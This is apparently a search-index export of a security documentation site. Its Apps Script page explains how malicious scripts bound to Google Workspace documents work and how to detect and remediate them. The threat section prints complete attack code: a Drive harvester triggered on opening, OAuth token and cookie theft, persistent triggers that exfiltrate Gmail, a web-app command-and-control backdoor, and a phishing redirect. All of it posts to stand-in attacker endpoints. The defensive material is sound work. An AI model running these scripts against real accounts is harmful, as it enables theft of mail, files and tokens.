{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Google Security Suite","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"#overview","title":"\ud83d\udee1\ufe0f Overview","text":"<p>This guide provides security professionals, cloud architects, and IT administrators with detailed strategies for securing Google products and services. It focuses on practical implementation of security controls, architecture patterns, identity protection, threat detection, and incident response across the Google ecosystem.</p> <ul> <li> Comprehensive Coverage</li> </ul> <p>Security guidance spanning Google Workspace, GCP, Chrome, and cross-product integrations</p> <ul> <li>:office_building: Practical Implementation</li> </ul> <p>Step-by-step instructions for implementing security controls across Google products</p> <ul> <li> Threat Detection &amp; Response</li> </ul> <p>Advanced techniques for identifying and responding to security threats in Google environments</p> <ul> <li> Reference Architectures</li> </ul> <p>Security architecture patterns and best practices for Google services</p>"},{"location":"#about-this-project","title":"\ud83d\udd0d About This Project","text":"<p>The Google Security Suite is designed to provide comprehensive security guidance for organizations of all sizes using Google products and services, with coverage across Google Workspace, Google Cloud Platform, Chrome, and cross-product integrations.</p>"},{"location":"#key-features","title":"Key Features","text":"<ul> <li>Comprehensive Coverage: Security guidance for all major Google products and services</li> <li>Practical Implementation Guidance: Step-by-step instructions for implementing security controls</li> <li>Reference Architectures: Security architecture patterns for Google environments</li> <li>Cross-Product Integration: Security strategies that work across Google services</li> <li>Threat Detection &amp; Response: Advanced techniques for identifying and responding to security incidents</li> <li>Security Templates: Ready-to-use checklists and implementation frameworks</li> <li>Technical Deep Dives: Detailed exploration of Google security features</li> </ul>"},{"location":"#target-audience","title":"Target Audience","text":"<p>This suite is primarily designed for:</p> <ul> <li>Security Professionals: Responsible for securing Google environments</li> <li>Cloud Architects: Designing secure Google Cloud architectures</li> <li>IT Administrators: Managing Google deployments</li> <li>Security Engineers: Implementing technical security controls</li> <li>DevSecOps Teams: Building secure CI/CD pipelines and infrastructure</li> <li>Managed Service Providers: Supporting multiple client environments</li> <li>Security Consultants: Advising on Google security implementations</li> <li>Compliance Officers: Ensuring regulatory compliance in Google environments</li> </ul>"},{"location":"#getting-started","title":"Getting Started","text":"<p>This documentation is organized into several main sections:</p> <ol> <li>Google Workspace Security: Security strategies for Google Workspace environments</li> <li>Core security components for Workspace</li> <li> <p>Advanced security topics for specialized scenarios</p> </li> <li> <p>Google Cloud Platform Security: Security guidance for GCP</p> </li> <li>Identity and access management</li> <li>Network, compute, and data security</li> <li> <p>Compliance and governance</p> </li> <li> <p>Google Chrome Security: Browser security controls and management</p> </li> <li>Enterprise configuration and policy management</li> <li>Extension security and web filtering</li> <li> <p>Zero Trust browser security</p> </li> <li> <p>Cross-Product Security: Security strategies that span Google products</p> </li> <li>Identity federation and unified access management</li> <li>Integrated threat detection and response</li> <li>Comprehensive security architecture</li> </ol> <p>Use the navigation menu to explore specific topics. Each section provides detailed guidance, implementation steps, and security best practices for Google environments.</p> <p>This guide is continually updated as Google security capabilities evolve.</p>"},{"location":"apps-script-security/","title":"Apps Script Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"apps-script-security/#google-apps-script-security-hidden-dangers-and-detection-strategies","title":"Google Apps Script Security: Hidden Dangers and Detection Strategies","text":"<p>This guide provides security professionals and MSPs with comprehensive coverage of the security risks associated with Google Apps Script, focusing on detection, prevention, and remediation strategies.</p> <p>Attribution: This guide incorporates insights from the excellent HackTricks Google Apps Script Phishing Guide. We recommend reviewing the original resource for additional offensive security perspectives.</p>"},{"location":"apps-script-security/#understanding-the-apps-script-threat-landscape","title":"Understanding the Apps Script Threat Landscape","text":""},{"location":"apps-script-security/#what-makes-apps-script-dangerous","title":"What Makes Apps Script Dangerous","text":"<p>Google Apps Script presents unique security challenges due to its powerful capabilities and integration with Google Workspace:</p> <ol> <li>Native Integration</li> <li>Scripts run within Google's infrastructure</li> <li>Direct access to user's Google services</li> <li> <p>Ability to interact across multiple Google products</p> </li> <li> <p>Persistence Mechanisms</p> </li> <li>Scripts can create time-driven triggers</li> <li>Can establish document-based triggers (onOpen, onEdit)</li> <li> <p>Ability to deploy as web applications</p> </li> <li> <p>Privileged Execution</p> </li> <li>Scripts execute with the user's permissions</li> <li>Can access sensitive data across services</li> <li> <p>May operate with admin privileges if authorized by an administrator</p> </li> <li> <p>Stealth Capabilities</p> </li> <li>Scripts can be embedded in documents with minimal visibility</li> <li>No obvious indication of script execution in many cases</li> <li>Can operate silently in the background</li> </ol>"},{"location":"apps-script-security/#the-harmless-spreadsheet-attack-vector","title":"The \"Harmless Spreadsheet\" Attack Vector","text":"<p>A particularly dangerous attack vector involves embedding malicious Apps Script in seemingly innocuous spreadsheets or documents:</p> <p>Attack Scenario: 1. Attacker creates a legitimate-looking Google Sheet with embedded malicious script 2. Script is configured with an <code>onOpen</code> trigger to execute when document is opened 3. Document is shared with target users with a convincing pretext 4. When opened, the script executes with the user's permissions</p> <p>Malicious Activities Possible: - Exfiltrating sensitive data from the user's Drive, Gmail, or Calendar - Creating persistence mechanisms for ongoing access - Deploying additional malicious scripts - Manipulating document sharing permissions - Establishing backdoor access to the user's account</p>"},{"location":"apps-script-security/#technical-analysis-of-high-risk-script-patterns","title":"Technical Analysis of High-Risk Script Patterns","text":""},{"location":"apps-script-security/#1-malicious-onopen-triggers","title":"1. Malicious onOpen Triggers","text":"<p>The <code>onOpen</code> trigger is particularly dangerous as it executes automatically when a document is opened:</p> <pre><code>// Example of malicious onOpen trigger in a Google Sheet\nfunction onOpen() {\n  // Appears innocuous - creates a custom menu\n  SpreadsheetApp.getUi()\n    .createMenu('Helpful Tools')\n    .addItem('Update Data', 'updateData')\n    .addToUi();\n    \n  // Covert malicious function execution\n  harvestUserData();\n}\n\n// The malicious function that runs silently on open\nfunction harvestUserData() {\n  // Access user's Drive files\n  const files = DriveApp.getFiles();\n  let sensitiveFiles = [];\n  \n  while (files.hasNext()) {\n    const file = files.next();\n    // Look for sensitive content\n    if (file.getName().toLowerCase().includes('confidential') || \n        file.getName().toLowerCase().includes('password') ||\n        file.getName().toLowerCase().includes('financial')) {\n      sensitiveFiles.push({\n        name: file.getName(),\n        id: file.getId(),\n        url: file.getUrl()\n      });\n    }\n  }\n  \n  // Exfiltrate the data\n  if (sensitiveFiles.length &gt; 0) {\n    exfiltrateData(sensitiveFiles);\n  }\n}\n\n// Function to exfiltrate data\nfunction exfiltrateData(data) {\n  // Option 1: Send to attacker-controlled web service\n  UrlFetchApp.fetch('https://attacker-controlled-endpoint.com/collect', {\n    'method': 'post',\n    'contentType': 'application/json',\n    'payload': JSON.stringify(data)\n  });\n  \n  // Option 2: Add attacker as viewer to sensitive files\n  for (let i = 0; i &lt; data.length; i++) {\n    try {\n      DriveApp.getFileById(data[i].id).addViewer('attacker@example.com');\n    } catch (e) {\n      // Silently fail if permission can't be added\n    }\n  }\n}\n\n// OAuth Token Exfiltration Example\nfunction stealOAuthToken() {\n  // Get active user and OAuth token\n  var userEmail = Session.getActiveUser().getEmail();\n  var oauthToken = ScriptApp.getOAuthToken();\n  \n  // Send captured token to attacker-controlled endpoint\n  UrlFetchApp.fetch('https://attacker-controlled-endpoint.com/tokens', {\n    'method': 'post',\n    'contentType': 'application/json',\n    'payload': JSON.stringify({\n      'email': userEmail,\n      'token': oauthToken,\n      'timestamp': new Date().toISOString()\n    })\n  });\n  \n  // Return something innocuous to avoid suspicion\n  return \"Processing complete!\";\n}\n</code></pre>"},{"location":"apps-script-security/#2-time-based-triggers-for-persistence","title":"2. Time-Based Triggers for Persistence","text":"<p>Time-based triggers create persistent access that continues to operate even after the user closes the document:</p> <pre><code>// Function that creates a persistent time-based trigger\nfunction establishPersistence() {\n  // Delete any existing triggers with the same function name\n  // to avoid duplicate triggers\n  const triggers = ScriptApp.getProjectTriggers();\n  for (let i = 0; i &lt; triggers.length; i++) {\n    if (triggers[i].getHandlerFunction() === 'exfiltrateEmails') {\n      ScriptApp.deleteTrigger(triggers[i]);\n    }\n  }\n  \n  // Create new trigger that runs every hour\n  ScriptApp.newTrigger('exfiltrateEmails')\n    .timeBased()\n    .everyHours(1)\n    .create();\n    \n  // Create another trigger that runs daily to maintain persistence\n  ScriptApp.newTrigger('checkAndReestablishTriggers')\n    .timeBased()\n    .everyDays(1)\n    .create();\n}\n\n// Function executed by the trigger\nfunction exfiltrateEmails() {\n  // Search for sensitive emails\n  const threads = GmailApp.search('from:finance OR subject:confidential OR subject:password');\n  \n  // Extract email data\n  let emailData = [];\n  for (let i = 0; i &lt; threads.length &amp;&amp; i &lt; 10; i++) {\n    const messages = threads[i].getMessages();\n    for (let j = 0; j &lt; messages.length; j++) {\n      const message = messages[j];\n      emailData.push({\n        from: message.getFrom(),\n        to: message.getTo(),\n        subject: message.getSubject(),\n        date: message.getDate(),\n        body: message.getPlainBody().substring(0, 1000) // Limit size\n      });\n    }\n  }\n  \n  // Exfiltrate data if found\n  if (emailData.length &gt; 0) {\n    UrlFetchApp.fetch('https://attacker-endpoint.com/emails', {\n      'method': 'post',\n      'contentType': 'application/json',\n      'payload': JSON.stringify(emailData)\n    });\n  }\n}\n\n// Function to check and reestablish triggers if removed\nfunction checkAndReestablishTriggers() {\n  let foundExfilTrigger = false;\n  \n  // Check if our triggers still exist\n  const triggers = ScriptApp.getProjectTriggers();\n  for (let i = 0; i &lt; triggers.length; i++) {\n    if (triggers[i].getHandlerFunction() === 'exfiltrateEmails') {\n      foundExfilTrigger = true;\n      break;\n    }\n  }\n  \n  // If trigger was removed, recreate it\n  if (!foundExfilTrigger) {\n    establishPersistence();\n  }\n}\n</code></pre>"},{"location":"apps-script-security/#3-web-app-deployment-for-external-access","title":"3. Web App Deployment for External Access","text":"<p>Malicious scripts can be deployed as web apps to enable external control and data access:</p> <pre><code>// Function to set up a malicious web app\nfunction setupWebApp() {\n  // This function would be manually run once to deploy the script as a web app\n  // The attacker would need to authorize it with appropriate permissions\n  console.log(\"Deploy this script as a web app with the following settings:\");\n  console.log(\"- Execute as: User accessing the web app\");\n  console.log(\"- Who has access: Anyone within [organization]\");\n}\n\n// This function handles GET requests\nfunction doGet(e) {\n  // Provide an innocuous interface\n  return HtmlService.createHtmlOutput('&lt;h1&gt;Data Processing Utility&lt;/h1&gt;&lt;p&gt;System is operational.&lt;/p&gt;');\n}\n\n// This function handles POST requests - the actual backdoor\nfunction doPost(e) {\n  const request = JSON.parse(e.postData.contents);\n  let response = { status: 'error', data: null };\n  \n  // Command and control functionality\n  switch (request.command) {\n    case 'list_files':\n      response.data = listFiles(request.query || '');\n      response.status = 'success';\n      break;\n    case 'read_file':\n      response.data = readFile(request.fileId);\n      response.status = 'success';\n      break;\n    case 'create_trigger':\n      response.data = createCustomTrigger(request.functionName, request.frequency);\n      response.status = 'success';\n      break;\n    case 'execute_function':\n      response.data = executeFunction(request.functionName, request.parameters);\n      response.status = 'success';\n      break;\n    default:\n      response.data = 'Unknown command';\n  }\n  \n  return ContentService.createTextOutput(JSON.stringify(response))\n    .setMimeType(ContentService.MimeType.JSON);\n}\n\n// Helper functions for the backdoor\nfunction listFiles(query) {\n  // List files based on a search query\n  const files = DriveApp.searchFiles(query || 'trashed=false');\n  let fileList = [];\n  \n  while (files.hasNext()) {\n    const file = files.next();\n    fileList.push({\n      id: file.getId(),\n      name: file.getName(),\n      type: file.getMimeType(),\n      size: file.getSize(),\n      url: file.getUrl(),\n      dateCreated: file.getDateCreated(),\n      lastUpdated: file.getLastUpdated()\n    });\n  }\n  \n  return fileList;\n}\n\nfunction readFile(fileId) {\n  // Read content of a specific file\n  try {\n    const file = DriveApp.getFileById(fileId);\n    if (file.getMimeType() === 'application/vnd.google-apps.document') {\n      return DocumentApp.openById(fileId).getBody().getText();\n    } else {\n      // For binary files, we could convert to base64 or provide metadata\n      return {\n        name: file.getName(),\n        size: file.getSize(),\n        type: file.getMimeType(),\n        cannotRead: 'Binary or unsupported file type'\n      };\n    }\n  } catch (e) {\n    return { error: e.toString() };\n  }\n}\n\n// Additional backdoor functions would be implemented here\n</code></pre>"},{"location":"apps-script-security/#4-oauth-token-theft-via-apps-script","title":"4. OAuth Token Theft via Apps Script","text":"<p>Scripts can be used to steal and exfiltrate OAuth tokens for persistent access:</p> <pre><code>// NOTE: This is a simplified conceptual example\n// Actual implementation would depend on available exploits and vulnerabilities\n\nfunction attemptTokenExtraction() {\n  // This is a conceptual representation\n  // Direct token extraction is not usually possible due to security measures\n  // But various techniques might be attempted depending on current vulnerabilities\n  \n  try {\n    // Approach 1: Attempt to access token through client-side vulnerabilities\n    // Create HTML with JavaScript that attempts to extract tokens from localStorage or cookies\n    const html = HtmlService.createHtmlOutput(`\n      &lt;script&gt;\n        // Attempt to extract tokens from various storage locations\n        const tokens = {\n          localStorage: Object.keys(localStorage)\n            .filter(key =&gt; key.includes('token') || key.includes('auth'))\n            .reduce((obj, key) =&gt; {\n              obj[key] = localStorage.getItem(key);\n              return obj;\n            }, {}),\n          cookies: document.cookie\n        };\n        \n        // Send back to script\n        google.script.run.receiveTokens(tokens);\n      &lt;/script&gt;\n    `);\n    \n    // Show the HTML briefly to execute the script\n    SpreadsheetApp.getUi().showModalDialog(html, 'Processing Data...');\n  } catch (e) {\n    console.log('Token extraction failed: ' + e.toString());\n  }\n}\n\nfunction receiveTokens(tokenData) {\n  // Exfiltrate any captured token data\n  UrlFetchApp.fetch('https://attacker-endpoint.com/tokens', {\n    'method': 'post',\n    'contentType': 'application/json',\n    'payload': JSON.stringify(tokenData)\n  });\n}\n\n// Direct ScriptApp.getOAuthToken theft\nfunction directTokenTheft() {\n  // Request access to specific API scopes for more permissions\n  // This will be visible during script authorization, but users often click through\n  var AdminDirectory = AdminDirectory || {};  // Reference to trigger scope request\n  var Gmail = Gmail || {};                   // Reference to trigger scope request\n  var Drive = Drive || {};                   // Reference to trigger scope request\n  \n  try {\n    // Get the OAuth token with elevated scopes\n    var token = ScriptApp.getOAuthToken();\n    var email = Session.getActiveUser().getEmail();\n    \n    // Exfiltrate token\n    UrlFetchApp.fetch('https://attacker-endpoint.com/tokens', {\n      'method': 'post',\n      'contentType': 'application/json',\n      'payload': JSON.stringify({\n        'token': token,\n        'email': email,\n        'scope': 'elevated_permissions'\n      })\n    });\n    \n    // Can also establish persistence by creating time-based triggers\n    // that continue to extract and exfiltrate tokens\n    ScriptApp.newTrigger('directTokenTheft')\n      .timeBased()\n      .everyHours(12)  // Run every 12 hours\n      .create();\n      \n    return \"Processing complete!\";\n  } catch (e) {\n    return \"Error: \" + e.toString();\n  }\n}\n</code></pre>"},{"location":"apps-script-security/#detection-strategies-for-malicious-apps-script","title":"Detection Strategies for Malicious Apps Script","text":""},{"location":"apps-script-security/#1-administrative-audit-and-controls","title":"1. Administrative Audit and Controls","text":"<p>Implement proper administrative controls to detect and prevent malicious Apps Script:</p> <p>Apps Script Project Audit: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Apps Script\n- Review and configure Apps Script settings\n- Set appropriate controls for:\n  - Apps Script API access\n  - Deployment of web apps and add-ons\n  - Apps Script runtime access\n</code></pre></p> <p>Key Settings to Configure: - Set Google Cloud Platform (GCP) trust to Block all API access or Only allow trusted - Configure Apps Script API access appropriately - Set External user access to restrict web app accessibility</p> <p>Script Project Inventory: <pre><code># Python script to inventory Apps Script projects\n# Requires Apps Script API enabled and authorized\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\n\ndef list_all_apps_script_projects(admin_sdk_service, drive_service):\n    \"\"\"Retrieve all Apps Script projects across the organization\"\"\"\n    # Get all users in the organization\n    users = admin_sdk_service.users().list(customer='my_customer').execute()\n    \n    all_projects = []\n    \n    for user in users.get('users', []):\n        user_email = user['primaryEmail']\n        try:\n            # Get user's drive files that are Apps Script projects\n            script_files = drive_service.files().list(\n                q=\"mimeType='application/vnd.google-apps.script' and trashed=false\",\n                corpora=\"allDrives\",\n                includeItemsFromAllDrives=True,\n                supportsAllDrives=True,\n                fields=\"files(id, name, createdTime, owners, permissions, webViewLink)\"\n            ).execute()\n            \n            # Add to our collection with user info\n            for script in script_files.get('files', []):\n                script['ownerEmail'] = user_email\n                all_projects.append(script)\n                \n        except Exception as e:\n            print(f\"Error processing {user_email}: {str(e)}\")\n    \n    return all_projects\n\n# Setup authentication\ncredentials = ServiceAccountCredentials.from_json_keyfile_name(\n    'service-account.json',\n    ['https://www.googleapis.com/auth/admin.directory.user',\n     'https://www.googleapis.com/auth/drive.readonly']\n)\ncredentials = credentials.create_delegated('admin@domain.com')\n\nadmin_service = build('admin', 'directory_v1', credentials=credentials)\ndrive_service = build('drive', 'v3', credentials=credentials)\n\n# Get script projects\nscript_projects = list_all_apps_script_projects(admin_service, drive_service)\n</code></pre></p>"},{"location":"apps-script-security/#2-trigger-detection-and-monitoring","title":"2. Trigger Detection and Monitoring","text":"<p>Implement monitoring for Apps Script triggers which are key indicators of potentially malicious activity:</p> <p>Trigger Inventory Script: <pre><code>// Apps Script to audit triggers across documents\n// This would be deployed as an administrative tool\n\nfunction auditAllTriggers() {\n  // Get all spreadsheets in Drive\n  const spreadsheets = DriveApp.getFilesByType(MimeType.GOOGLE_SHEETS);\n  const documents = DriveApp.getFilesByType(MimeType.GOOGLE_DOCS);\n  \n  let allTriggers = [];\n  \n  // Process spreadsheets\n  while (spreadsheets.hasNext()) {\n    const file = spreadsheets.next();\n    try {\n      const ss = SpreadsheetApp.openById(file.getId());\n      allTriggers = allTriggers.concat(getTriggerInfo(file, ss));\n    } catch (e) {\n      console.log(`Error processing spreadsheet ${file.getName()}: ${e.message}`);\n    }\n  }\n  \n  // Process documents\n  while (documents.hasNext()) {\n    const file = documents.next();\n    try {\n      const doc = DocumentApp.openById(file.getId());\n      allTriggers = allTriggers.concat(getTriggerInfo(file, doc));\n    } catch (e) {\n      console.log(`Error processing document ${file.getName()}: ${e.message}`);\n    }\n  }\n  \n  // Output could be saved to a spreadsheet or sent via email\n  const report = createTriggerReport(allTriggers);\n  emailReport(report);\n}\n\nfunction getTriggerInfo(file, document) {\n  // This would need to be run with appropriate permissions\n  // and may not catch all triggers due to permission limitations\n  const triggers = ScriptApp.getUserTriggers(document);\n  \n  return triggers.map(trigger =&gt; {\n    return {\n      fileName: file.getName(),\n      fileId: file.getId(),\n      fileOwner: file.getOwner().getEmail(),\n      lastUpdated: file.getLastUpdated(),\n      triggerType: trigger.getEventType(),\n      handlerFunction: trigger.getHandlerFunction(),\n      triggerSource: trigger.getTriggerSource(),\n      triggerSourceId: trigger.getTriggerSourceId()\n    };\n  });\n}\n\nfunction createTriggerReport(triggers) {\n  // Create a report from trigger data\n  // Implementation details would depend on desired format\n}\n\nfunction emailReport(report) {\n  // Send the report to security team\n  GmailApp.sendEmail(\n    'security-team@company.com',\n    'Apps Script Trigger Audit Report',\n    'Please see the attached report for all Apps Script triggers.',\n    {\n      attachments: [report]\n    }\n  );\n}\n</code></pre></p> <p>Monitoring Suspicious Trigger Creation: <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Apps Script\n- Filter for \"Create Trigger\" events\n- Look for:\n  - Multiple triggers created in short timespan\n  - Triggers created outside business hours\n  - Triggers with unusual time intervals (very frequent)\n  - Time-based triggers in documents from external sources\n</code></pre></p>"},{"location":"apps-script-security/#3-telemetry-analysis-for-apps-script-activity","title":"3. Telemetry Analysis for Apps Script Activity","text":"<p>Implement telemetry analysis to detect suspicious Apps Script behavior:</p> <p>Key Telemetry Indicators:</p> <ol> <li>URL Fetch Activity</li> <li>Monitor for scripts making external API calls</li> <li>Look for unusual destinations or patterns</li> <li> <p>Track data volume in outbound requests</p> </li> <li> <p>Service Usage Patterns</p> </li> <li>Unusual combinations of service access (Gmail + Drive + Calendar)</li> <li>High volume of API calls to sensitive services</li> <li> <p>Access to services unrelated to document's purpose</p> </li> <li> <p>Cross-User Activity</p> </li> <li>Scripts that access multiple users' data</li> <li>Scripts that establish triggers across multiple users</li> <li>Scripts deployed as web apps with unusual access patterns</li> </ol> <p>Sample Monitoring Query: <pre><code>-- Pseudocode for suspicious Apps Script telemetry analysis\nSELECT script_id, user_email, service_name, method_name, \n       COUNT(*) as call_count, external_domains,\n       MIN(timestamp) as first_seen, MAX(timestamp) as last_seen\nFROM apps_script_logs\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\n  AND (\n    -- External data exfiltration indicators\n    method_name = 'UrlFetchApp.fetch' \n    OR\n    -- Trigger creation indicators\n    method_name LIKE '%createTrigger%'\n    OR\n    -- Suspicious service usage\n    (service_name IN ('Gmail', 'Drive', 'AdminDirectory') AND\n     method_name LIKE '%list%' OR method_name LIKE '%get%')\n  )\nGROUP BY script_id, user_email, service_name, method_name, external_domains\nHAVING call_count &gt; 10\nORDER BY call_count DESC\n</code></pre></p>"},{"location":"apps-script-security/#4-document-analysis-for-hidden-scripts","title":"4. Document Analysis for Hidden Scripts","text":"<p>Identify potentially malicious scripts embedded in documents:</p> <p>Document Scanning Script: <pre><code># Python script to scan documents for hidden scripts\n# Requires Google Workspace API access\n\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\nimport re\n\ndef scan_documents_for_scripts(drive_service):\n    \"\"\"Scan documents for embedded scripts\"\"\"\n    # Get all Google Docs and Sheets\n    file_types = \"'application/vnd.google-apps.document','application/vnd.google-apps.spreadsheet'\"\n    files = drive_service.files().list(\n        q=f\"mimeType in [{file_types}] and trashed=false\",\n        fields=\"files(id, name, mimeType, owners, createdTime, modifiedTime)\"\n    ).execute()\n    \n    suspicious_files = []\n    \n    for file in files.get('files', []):\n        try:\n            # For each file, check if it has associated scripts\n            script_links = find_associated_scripts(drive_service, file['id'], file['mimeType'])\n            \n            if script_links:\n                file['associated_scripts'] = script_links\n                suspicious_files.append(file)\n        except Exception as e:\n            print(f\"Error scanning {file['name']}: {str(e)}\")\n    \n    return suspicious_files\n\ndef find_associated_scripts(drive_service, file_id, mime_type):\n    \"\"\"Find scripts associated with a document\"\"\"\n    # This is a simplified approach - actual implementation would\n    # need to use document-specific APIs to find bound scripts\n    \n    # For demonstration purposes, we're using a basic check\n    # A more robust solution would require additional APIs and permissions\n    \n    # Check for container-bound scripts\n    linked_scripts = drive_service.files().list(\n        q=f\"'{file_id}' in parents and mimeType='application/vnd.google-apps.script'\",\n        fields=\"files(id, name, owners)\"\n    ).execute()\n    \n    return linked_scripts.get('files', [])\n\n# Authentication setup\ncredentials = ServiceAccountCredentials.from_json_keyfile_name(\n    'service-account.json',\n    ['https://www.googleapis.com/auth/drive.readonly']\n)\ncredentials = credentials.create_delegated('admin@domain.com')\ndrive_service = build('drive', 'v3', credentials=credentials)\n\n# Scan documents\nsuspicious_docs = scan_documents_for_scripts(drive_service)\n</code></pre></p> <p>Risk Assessment Criteria for Document Scripts:</p> <ol> <li>Document Origin:</li> <li>External sharing source</li> <li>Recently shared from outside organization</li> <li> <p>Anonymous or unknown creator</p> </li> <li> <p>Script Characteristics:</p> </li> <li>Script created by different user than document owner</li> <li>Script modified after document creation</li> <li> <p>Script with obfuscated or minimal code</p> </li> <li> <p>Permission Requests:</p> </li> <li>Scripts requesting unusual permissions</li> <li>Multiple services accessed by single script</li> <li>Sensitive scopes like Gmail or AdminDirectory</li> </ol>"},{"location":"apps-script-security/#prevention-and-remediation-strategies","title":"Prevention and Remediation Strategies","text":""},{"location":"apps-script-security/#1-apps-script-security-controls","title":"1. Apps Script Security Controls","text":"<p>Implement organization-wide controls to prevent malicious script execution:</p> <p>Admin Console Settings: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Apps Script\n- Set \"Google Cloud Platform (GCP) trust\" to \"Only allow trusted\"\n- Configure \"Apps Script API\" access appropriately\n- Set \"External user access\" to restrict web app accessibility\n- Enable \"Script runtime API access\" control\n- Configure \"Apps Script add-on gallery\" access\n</code></pre></p> <p>Organizational Script Policies: 1. Create clear policy for acceptable Apps Script development 2. Establish review process for production scripts 3. Document required security practices for script development 4. Implement approval workflow for scripts accessing sensitive services</p>"},{"location":"apps-script-security/#2-technical-protective-measures","title":"2. Technical Protective Measures","text":"<p>Implement technical controls to reduce Apps Script risks:</p> <p>Service Account Restrictions: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide Delegation\n- Review and restrict service accounts with domain-wide delegation\n- Limit OAuth scopes available to service accounts\n- Implement regular reviews of delegated access\n</code></pre></p> <p>Script Execution Controls: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive and Docs &gt; Features and Applications\n- Configure \"Apps Script\" settings appropriately\n- Consider disabling for high-security OUs\n</code></pre></p> <p>External Document Controls: <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive and Docs &gt; Sharing settings\n- Configure \"Sharing outside of [organization]\" settings\n- Control \"Access Checker\" for shared files\n- Set appropriate \"File sharing\" restrictions\n</code></pre></p>"},{"location":"apps-script-security/#3-user-education-and-awareness","title":"3. User Education and Awareness","text":"<p>Develop education programs to help users identify risky scripts:</p> <p>Key User Guidance: 1. Be suspicious of documents requiring immediate enabling of content 2. Check script authorization permissions before accepting 3. Verify document source and sender authenticity 4. Report suspicious automation or unexpected behavior 5. Look for warning signs like unfamiliar permission requests</p> <p>Warning Signs to Communicate: - Documents requesting unusual permissions - Spreadsheets with unexpected \"Loading...\" or processing messages - Documents from external sources that require macro/script enabling - Files claiming to need \"enhanced features\" to function properly</p>"},{"location":"apps-script-security/#4-incident-response-for-malicious-scripts","title":"4. Incident Response for Malicious Scripts","text":"<p>Develop specific incident response procedures for Apps Script compromise:</p> <p>Immediate Actions:</p> <ol> <li>Identify Affected Documents</li> <li>Locate all documents containing the suspicious script</li> <li> <p>Identify document sharing scope and potentially affected users</p> </li> <li> <p>Contain the Threat</p> </li> <li>Remove sharing permissions from affected documents</li> <li>Disable suspected malicious scripts through Admin Console</li> <li> <p>Block external domains used for data exfiltration</p> </li> <li> <p>Eliminate Persistence</p> </li> <li>Identify and remove time-based or document triggers</li> <li>Check for deployed web applications</li> <li> <p>Review cross-document permissions and access</p> </li> <li> <p>User Account Remediation</p> </li> <li>Reset passwords for affected users</li> <li>Revoke suspicious OAuth tokens</li> <li>Re-enable two-factor authentication if bypassed</li> </ol> <p>Investigation Procedures:</p> <ol> <li>Script Analysis</li> <li>Extract and review script code for malicious functionality</li> <li>Identify data access and potential exfiltration methods</li> <li> <p>Determine initial access vector and trigger mechanisms</p> </li> <li> <p>Impact Assessment</p> </li> <li>Review audit logs for accessed data</li> <li>Analyze API usage patterns for affected users</li> <li> <p>Determine scope of data exposure or manipulation</p> </li> <li> <p>Root Cause Analysis</p> </li> <li>Identify how the script was introduced to the environment</li> <li>Determine if user error or security control failure enabled the attack</li> <li>Document security improvements needed to prevent recurrence</li> </ol>"},{"location":"apps-script-security/#emerging-threats-and-advanced-techniques","title":"Emerging Threats and Advanced Techniques","text":""},{"location":"apps-script-security/#sandbox-escape-techniques","title":"Sandbox Escape Techniques","text":"<p>Advanced attackers may attempt to escape Apps Script sandboxing:</p> <p>Potential Techniques: 1. Exploiting vulnerabilities in Apps Script runtime environment 2. Leveraging client-side JavaScript execution within HTML Service 3. Combining Apps Script with other attack vectors for privilege escalation 4. Exploiting trusted communications between Apps Script and Google services</p> <p>Detection Focus: - Unusual combinations of Apps Script and client-side JavaScript - Scripts with minimal visible functionality but extensive HTML service usage - Excessive or unusual error patterns in script execution - Scripts accessing multiple Google services with unusual patterns</p>"},{"location":"apps-script-security/#supply-chain-risks","title":"Supply Chain Risks","text":"<p>Be aware of supply chain risks involving third-party scripts:</p> <p>Risk Scenarios: 1. Legitimate third-party add-ons compromised by attackers 2. Development tools or libraries containing malicious code 3. Trusted scripts modified by insider threats 4. Abandoned scripts acquired and weaponized by threat actors</p> <p>Mitigation Strategies: - Implement vetting process for third-party scripts and add-ons - Create inventory of approved scripts and developers - Conduct periodic security reviews of third-party components - Monitor for unusual changes to previously vetted scripts</p>"},{"location":"apps-script-security/#apps-script-phishing-techniques","title":"Apps Script Phishing Techniques","text":""},{"location":"apps-script-security/#malicious-redirect-web-apps","title":"Malicious Redirect Web Apps","text":"<p>Attackers leverage Google Apps Script's ability to deploy web applications for phishing:</p> <pre><code>// Example of a malicious Apps Script web app that redirects to a phishing site\n\n// Standard Apps Script doGet function\nfunction doGet(e) {\n  // Extract parameters from the request\n  var params = e.parameter;\n  var email = params.email || '';\n  \n  // Create HTML with redirect to phishing site\n  var html = HtmlService.createHtmlOutput(`\n    &lt;!DOCTYPE html&gt;\n    &lt;html&gt;\n      &lt;head&gt;\n        &lt;title&gt;Google Document&lt;/title&gt;\n        &lt;script&gt;\n          // Redirect to phishing site with extracted parameters\n          window.location.href = \"https://malicious-phishing-site.com/google-login?email=${email}\";\n        &lt;/script&gt;\n      &lt;/head&gt;\n      &lt;body&gt;\n        &lt;p&gt;Loading document, please wait...&lt;/p&gt;\n      &lt;/body&gt;\n    &lt;/html&gt;\n  `);\n  \n  // Return the HTML content\n  return html;\n}\n</code></pre> <p>Distribution Techniques: 1. Deploy as web app with \"Anyone, even anonymous\" access 2. Send link via email, chat, or calendar invites 3. Disguise link with URL shortener or in messages 4. Include user's email as parameter for personalized phishing</p> <p>Why This Works: - Uses legitimate <code>script.google.com</code> domain - Appears as Google-hosted content to users - May bypass URL filtering that trusts Google domains - Creates sense of legitimacy due to hosting on Google infrastructure</p>"},{"location":"apps-script-security/#enhanced-defense-strategies","title":"Enhanced Defense Strategies","text":"<ol> <li> <p>Web App Deployment Controls <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Apps Script\n- Set \"Deploy as web app\" to \"Off\" or \"Only specific users\"\n- Configure appropriate sharing restrictions\n- Implement approval process for web app 